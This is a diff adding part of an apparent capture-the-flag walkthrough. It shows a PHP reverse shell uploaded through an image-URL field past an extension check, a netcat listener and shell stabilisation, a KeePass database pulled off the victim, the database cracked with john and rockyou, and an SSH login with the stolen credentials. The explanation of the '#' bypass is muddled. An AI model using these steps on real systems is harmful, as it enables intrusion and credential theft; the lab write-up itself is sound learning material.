@@ -103,7 +103,154 @@ Navigate there:
 ![image](https://cdn-images-1.medium.com/max/1000/1*ykpbEERdhg-i09w0aF8T1Q.png)
 
 
-Now, Let's try to get more information about the behavior with burp:
+I tried to upload a reverse shell by using http server with python.
+
+on your machine whithin the directory that rev shell file is located us this command:
+
+```bash
+python3 -m http.server
+```
+By default, this server uses port 8000.
+
+Inside the external image input I use this:
+
+http://<your-ip>:8000/php-reverse-shell.php
+
+The behavior of the site did nothing and I didnt get any log that request was made. so I guess that the file didn't make it to 
+the victim machine.
+
+![image](https://cdn-images-1.medium.com/max/1000/1*HgbyvK_SLT1FMCd8DXsXwg.png)
+
+
+So, maybe there is any validation otn the file extension that command
+us to upload only jpg or png file.
+so it's time to bypass this machanism with adding another extension to the file
+with .php#.png .
+so the rev shell file looks like php-reverse-shell.php#.png when you enter it on extenal URL.
+By using "#00" sign, the web server interpreter it like php file but let us upload it as png file.
+the server might treat the file as a PHP file, potentially executing PHP code, even though it's followed by .png, which could confuse the server or security measures.
+Give it a try:
+
+![image](https://cdn-images-1.medium.com/max/1000/1*WiL92ECdp465DleyRQwNTw.png)
+
+After it has been uploaded, do the same but now, set a netcat listener with the port 
+that you set on the script.
+
+```bash
+nc -lnvp 2222
+```
+
+After it has been completed you'll get the reverse shell.
+
+![image](https://cdn-images-1.medium.com/max/1000/1*plOKVBhFVFXjnZGiN68wKw.png)
+
+stabilize it with:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+While enumaration process I found .kdbx file within /opt directory.
+
+A KDBX file is a database file format used by password managers, particularly KeePass and its derivatives like KeePassXC.
+
+Let's grab it to our machine with open http server on another port on the victim machine:
+
+```bash
+python3 -m http.server 2000
+```
+
+Grab the file on your machine with:
+
+wget http://10.10.87.30:2000/dataset.kdbx
+
+![image](https://cdn-images-1.medium.com/max/1000/1*2PRqxPLYzYME7Qqwoz8G4A.png)
+
+I tried to open the file but without any success. google will help me. 
+to open keepass file you need to use kpcli so download it with.
+
+```bash
+sudo apt install kpcli
+```
+
+Open it with kpcli, but you have to provide masterpassword to open it.
+
+```
+Type "help <command>" for more detailed help on a command.
+kpcli:/> open dataset.kdbx
+Provide the master password:
+```
+
+keepass2john will help me to provide format that john the ripper can work it (hash).
+The next step will be using dictionary attack.
+
+Use this command:
+
+```bash
+keepass2john dataset.kdbx > john.txt
+```
+and for the next step:
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt john.txt
+```
+
+![image](https://cdn-images-1.medium.com/max/1000/1*UIhtZOnQm_GVoUlBHwn8wQ.png)
+
+
+Now, after getting the password we can open the keepass file and 
+there is a username and a password.
+
+![image](https://cdn-images-1.medium.com/max/1000/1*97lNYqbZ14fDwNu9nImvDg.png)
+
+remember that there is ssh service open on that machine so try to 
+connect it with the new credentials within the keepass file.
+
+```bash
+ssh sysadmin@10.10.87.30
+```
+
+enter the password and we are in.
+grab local.txt flag.
+
+![image](https://cdn-images-1.medium.com/max/1000/1*0vNNZS4TzOanPZkEHrOdQA.png)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
